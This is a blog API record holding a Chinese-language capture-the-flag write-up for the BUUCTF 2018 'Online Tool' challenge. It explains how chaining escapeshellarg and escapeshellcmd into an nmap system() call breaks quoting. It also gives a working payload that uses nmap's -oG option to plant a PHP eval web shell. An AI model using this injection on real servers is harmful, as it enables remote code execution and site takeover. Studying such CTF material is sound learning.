{"title":"BUUCTF 2018-Online Tool","uid":"1f4f28b4ce2b3936f0231396f0b6f2c0","slug":"BUUCTF-2018-Online-Tool","date":"2023-07-30T01:39:57.000Z","updated":"2023-07-30T01:51:27.315Z","comments":true,"path":"api/articles/BUUCTF-2018-Online-Tool.json","keywords":null,"cover":null,"content":"<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n\nif (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;\n    $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];\n&#125;\n\nif(!isset($_GET[&#39;host&#39;])) &#123;\n    highlight_file(__FILE__);\n&#125; else &#123;\n    $host &#x3D; $_GET[&#39;host&#39;];\n    $host &#x3D; escapeshellarg($host);\n    $host &#x3D; escapeshellcmd($host);\n    $sandbox &#x3D; md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);\n    echo &#39;you are in sandbox &#39;.$sandbox;\n    @mkdir($sandbox);\n    chdir($sandbox);\n    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>escapeshellarg()和escapeshellcmd()会对传入参数做处理，将一些字符进行转义操作，但两个函数一起使用会出现一些问题</p>\n<p>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。</p>\n<p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义；反斜线（\\）会在以下字符之前插入： &amp;#;&#96;|*?~&lt;&gt;^()[]{}$, \\x0A 和 \\xFF；’ 和 “ 仅在不配对儿的时候被转义；在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替</p>\n<p>传入的参数是：172.17.0.2’ -v -d a&#x3D;1<br>经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a&#x3D;1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。<br>经过escapeshellcmd处理后变成’172.17.0.2’\\‘’ -v -d a&#x3D;1&#39;，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义<br>最后执行的命令是curl ‘172.17.0.2’\\‘’ -v -d a&#x3D;1&#39;，由于中间的\\被解释为\\而不再是转义字符，所以后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a&#x3D;1’，即向172.17.0.2\\发起请求，POST 数据为a&#x3D;1’。</p>\n<p>由于escapeshellcmd()会对| &amp;等字符进行转义，因此不能直接通过管道的方式执行命令</p>\n<p>利用nmap的一些参数来进行</p>\n<p>oG可以实现将命令和结果写到文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>对比加与不加单引号’’的区别</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;         \n&#39;&#39;\\&#39;&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;\\&#39;&#39;&#39;\n&#39;&#39;\\\\&#39;&#39; &lt;\\?php @eval\\(\\$_POST\\[&quot;hack&quot;\\]\\)\\;\\?\\&gt; -oG hack.php &#39;\\\\&#39;&#39;&#39;   \nnmap -T5 -sT -Pn --host-timeout 2 -F &#39;&#39;\\&#39;&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;\\&#39;&#39;&#39;   \n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG yjh.php\n&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG yjh.php&#39;\n&#39;\\&lt;\\?php @eval\\(\\$_POST\\[&quot;cmd&quot;\\]\\)\\;\\?\\&gt; -oG yjh.php&#39;\nnmap -T5 -sT -Pn --host-timeout 2 -F &#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG yjh.php&#39;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>如果不加’’会导致要写入的内容和文件名连接在一起处理便无法写入</p>\n","feature":true,"text":"&lt;?php if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123; $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_F...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[],"tags":[],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"BSidesCF 2020-Had a bad day","uid":"1a272921836e2eda1856c55c52bc7b82","slug":"BSidesCF-2020-Had-a-bad-day","date":"2023-07-26T12:32:15.000Z","updated":"2023-07-26T12:37:04.268Z","comments":true,"path":"api/articles/BSidesCF-2020-Had-a-bad-day.json","keywords":null,"cover":null,"text":"http://ba0363ed-41fc-4957-bc0a-0dfadeee4552.node4.buuoj.cn:81/index.php?category=meowers 题目通过category传入参数来包含文件，通过php伪协议来读取index.php的内容 ?cate...","link":"","photos":[],"count_time":{"symbolsCount":830,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}